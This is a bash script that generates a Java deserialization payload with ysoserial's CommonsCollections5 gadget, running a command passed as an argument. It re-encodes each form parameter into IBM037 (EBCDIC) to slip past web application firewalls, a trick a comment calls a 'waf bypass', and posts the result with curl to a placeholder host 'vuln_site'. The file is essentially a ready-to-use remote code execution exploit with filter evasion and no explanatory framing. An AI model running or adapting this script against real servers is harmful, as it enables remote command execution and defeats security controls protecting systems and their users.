#!/bin/bash

function urldecode {
    plus_sub=' '
    [[ ! -z $1 ]] && plus_sub=+ #by default no translation of + to ' '
    tr "\\\\%${plus_sub}" '%\\ '|sed 's_\\_\\x_g'|xargs -0 printf %b|tr % '\\'
}

function urlencode {
    xxd -p|tr -d '\n'|sed 's/../%&/g'
}

#an example waf bypass by @irsdl
function enc {
    local target_enc
    
    target_enc=IBM037
    [[ ! -z $1 ]] && target_enc=$1
    iconv -f UTF-8 -t "$target_enc"
}

function run_processors {
    declare -n procs="${1}"
    local data
    
    IFS= read -r data
    for proc in "${procs[@]}";do
        data=$(printf %s "${data}"|eval "${proc}")
    done
    echo "$data"
}

function preproc {
    local data param param_name param_name_enc param_val param_val_enc
    
    data=""
    while IFS= read -r -d '&' param || [[ ! -z $param ]];do
        param_name=${param%%=*}
        param_name_dec=$(echo "$param_name"|run_processors "${1}")
        [[ $param_name == "${param}" ]] && {
            data=$(printf '%s&%s' "${data}" "$param_name_dec")
        } || {
            param_val=${param#"${param_name}="}
            param_val_dec=$(echo "$param_val"|run_processors "${1}")
            data=$(printf '%s&%s=%s' "${data}" "$param_name_dec" "$param_val_dec")
        }
    done
    echo "${data:1}"
}

processors=(urldecode "enc IBM037" urlencode)
static_data='param1=val1&state='
payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
data=$(printf "%s" "${static_data}${payload}"|preproc processors)

curl -i -s -k -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037' -d "$data" 'https://vuln_site'